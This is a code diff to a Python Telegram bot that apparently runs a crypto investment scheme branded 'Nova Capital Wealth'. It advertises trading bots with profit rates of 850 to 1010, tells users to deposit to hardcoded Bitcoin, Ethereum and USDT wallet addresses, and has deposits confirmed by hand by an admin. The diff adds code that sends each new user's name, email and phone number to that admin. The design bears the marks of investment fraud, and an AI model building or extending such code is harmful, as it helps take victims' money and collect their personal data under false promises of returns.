@@ -7,6 +7,7 @@ from telegram.ext import (
     filters, ContextTypes, ConversationHandler
 )
 from telegram.error import TelegramError
+from storage import user_data, crypto_addresses
 
 # Enable logging
 logging.basicConfig(
@@ -38,13 +39,7 @@ def get_admin_id() -> int:
         logger.error("ADMIN_USER_ID must be a valid integer!")
         return 0
 
-# In-memory storage
-user_data: Dict[int, Dict[str, Any]] = {}
-crypto_addresses = {
-    'Bitcoin': 'bc1qe4tluz39ac4zm3srnfnq5t9jpwrud256yw7g4j',
-    'Ethereum': '0xAB8aDbEEb9E953db7687Fbb0E070aA9635E9D8D5',
-    'USDT': '0xAB8aDbEEb9E953db7687Fbb0E070aA9635E9D8D5'
-}
+# Trading bots configuration
 trading_bots = {
     'NCW Trading Bot': {'description': 'Custom-built algorithm by Nova Capital Wealth for optimal profits.', 'profit_rate': 1010},
     'TrendSeeker': {'description': 'Conservative strategy focusing on steady market trends.', 'profit_rate': 850},
@@ -176,13 +171,32 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         
     user_info = get_user_data(user_id)
     user_info['phone'] = update.message.text.strip()
-    
     user_info['approved'] = True
+    
+    # Notify admin of new user registration
+    admin_message = f"""👤 **New User Registered**
+
+🆔 **User ID:** {user_id}
+👤 **Name:** {user_info['name']}
+📧 **Email:** {user_info['email']}
+📱 **Phone:** {user_info['phone']}"""
+    
+    try:
+        await context.bot.send_message(
+            chat_id=admin_id,
+            text=admin_message,
+            parse_mode='Markdown'
+        )
+        logger.info(f"Sent registration notification for user {user_id} to admin {admin_id}")
+    except TelegramError as e:
+        logger.error(f"Failed to notify admin of new user {user_id}: {e}")
     
     await update.message.reply_text(
         f"Welcome, {user_info['name']}! Your account is ready. Access the main menu to start trading.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
     )
+    logger.info(f"User {user_id} completed registration")
+    
     return MAIN_MENU
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -232,7 +246,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         else:
             await update.message.reply_text(menu_text, reply_markup=reply_markup, parse_mode='Markdown')
     except TelegramError as e:
-        logger.error(f"Failed to show main menu: {e}")
+        logger.error(f"Failed to show main menu for user {user_id}: {e}")
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="⚠️ Failed to load main menu. Please try again.",
@@ -400,13 +414,11 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     crypto_name = query.data.split('_')[-1]
     address = crypto_addresses[crypto_name]
     
-    # Send only the address as plain text for easy copying
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
         text=address
     )
     
-    # Show the deposit details again to maintain context
     amount = context.user_data.get('deposit_amount', 0)
     keyboard = [
         [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_address_{crypto_name}')],
@@ -533,9 +545,11 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
         
     try:
         logger.info(f"Processing deposit confirmation with callback data: {query.data}")
-        _, user_id_str, amount_str = query.data.split('_', 2)
-        target_user_id = int(user_id_str)
-        amount = float(amount_str)
+        parts = query.data.split('_')
+        if len(parts) < 3:
+            raise ValueError("Invalid callback data format")
+        target_user_id = int(parts[-2])
+        amount = float(parts[-1])
         
         if target_user_id not in user_data:
             logger.error(f"User {target_user_id} not found for deposit confirmation")
@@ -990,7 +1004,6 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
             parse_mode='Markdown'
         )
         
-        # Notify admin
         admin_message = f"""🤖 **Trading Bot Activated**
 
 👤 **User:** {user_info['name']} (ID: {user_id})
@@ -1118,7 +1131,6 @@ async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     user_id = update.effective_user.id
     user_info = get_user_data(user_id)
     
-    # If user is registered, return to main menu instead of ending
     if user_info['name'] and user_info['email'] and user_info['phone']:
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
@@ -1162,7 +1174,6 @@ def main() -> None:
         update_crypto_address, list_users, admin_help, send_login
     )
     
-    # Set admin_id in bot_data
     admin_id = get_admin_id()
     if admin_id:
         application.bot_data['admin_id'] = admin_id
